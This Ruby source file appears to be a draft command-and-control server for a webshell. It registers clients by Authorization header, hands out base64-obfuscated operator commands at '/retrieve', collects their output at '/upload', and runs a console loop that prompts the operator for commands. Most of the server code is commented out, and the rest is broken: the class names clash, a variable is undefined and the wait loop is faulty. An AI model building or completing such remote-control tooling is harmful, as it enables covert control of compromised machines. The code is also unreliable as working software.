require 'net/http/server'
require 'securerandom'
require 'base64'
require 'logger'

$cmd = ""
$output = ""
$register = false
$auth_hashes = []

class Webshell 
  attr_accessor :listen_ip
  attr_accessor :listen_port

  def initialize(opts={})
    @listen_ip    = opts['ip']   || '127.0.0.1'
    @listen_port  = opts['port'] || 8000
  end


  def start 
    server = WEBrick::HTTPServer.new(:BindAddress=>listen_ip, :Port => listen_port, :DocumentRoot => listen_root) 


    server.start
  end

end

#class WebShell < Sinatra::Base
#
#  #set :logging, true
#  set :mylogger, Logger.new("#{settings.root}/webshell.log")
#  set :bind, '0.0.0.0'
#  set :port, '4567'
#
#  helpers do
#    #
#    # Check if auth
#    #
#    def check_auth
#      unless env["HTTP_AUTHORIZATION"]
#        return false
#      end
    #
#      unless $auth_hashes.include?(env["HTTP_AUTHORIZATION"])
#        return false
#      end
    #
#      true
#    end
#
#    #
#    # register for auth
#    #
#    def register
#      unless env["HTTP_AUTHORIZATION"]
#        halt 401, 'go away!'
#      end
#
#      if $auth_hashes.include?(env["HTTP_AUTHORIZATION"])
#        return
#      end
#
#      $auth_hashes << env["HTTP_AUTHORIZATION"]
#      return
#    end
#  end
#
#  #
#  # send cmd, encoded like: xxxx+base64(cmd)
#  #
#  def send_cmd(cmd)
#    encoded_cmd = "#{SecureRandom.base64(3)}+#{Base64.encode64(cmd)}"
#    body encoded_cmd
#    logger.info("CMD:#{encoded_cmd}")
#  end
#
#  #
#  # Receive cmd response
#  #
#  def receive_cmd(response)
#    encoded_cmd = response[5..]
#    cmd = Base64.decode64(encoded_cmd)
#    logger.info("RES:#{cmd}")
#  end
#
#  #enable :sessions
#
#  get '/register' do 
#    register
#  end
#
#
#  before do
#    env["rack.logger"] = settings.mylogger
#
#    query = env["QUERY_STRING"]
#    msg = format("%s %s for %s",
#                 env["REQUEST_METHOD"],
#                 env["PATH_INFO"] + (query.empty? ? "" : "?#{query}"),
#                 (env['HTTP_X_FORWARDED_FOR'] || env["REMOTE_ADDR"] || "-"))
#    #logger.info(msg)
#
#    headers "Content-Type"  => "text/html; charset=utf-8"
#
#  end
#
#  get '/' do
#    halt 403, 'go away!' unless check_auth
#  end
#
#  get '/retrieve' do 
#    halt 403, 'go away!' unless check_auth
#    send_cmd($cmd)
#    $cmd = "" #clear the cmd
#  end
#
#  post '/upload' do 
#    halt 403, 'go away!' unless check_auth
#    request.body.rewind
#    cmd = receive_cmd(request.body.read)
#    $output = cmd
#  end
#
#end


puts "Starting, waiting client."
Thread.new do 
  WebShell.run!
end

while true
  unless $auth_hashes.empty?
    puts "Client registered."
    puts "cmd>"
    $cmd = gets.chomp
    puts "Waiting response..."
    while(!$output)
      puts $output
    end
  end
end


#class WebServer < WEBrick::HTTPServlet::AbstractServlet
  #attr_accessor :listen_ip
    #attr_accessor :listen_port
    #attr_accessor :listen_root

  #def initialize(ip, port, root)
    #@listen_ip    = ip   || '127.0.0.1'
    #@listen_port = port || 8000
    #@listen_root = root || File.expand_path('~/')
  #end

  #def start 
    #server = WEBrick::HTTPServer.new(:BindAddress=>listen_ip, :Port => listen_port, :DocumentRoot => listen_root) 

    ## catch the shutdown
    #trap 'INT' do server.shutdown end

    #server.start
  #end


  #def set_default_say(words)
    #default_words = words || "It works"

    #server.mount_proc '/' do |req, res|
      #res.body = default_words
  #end
  #end


      
#end









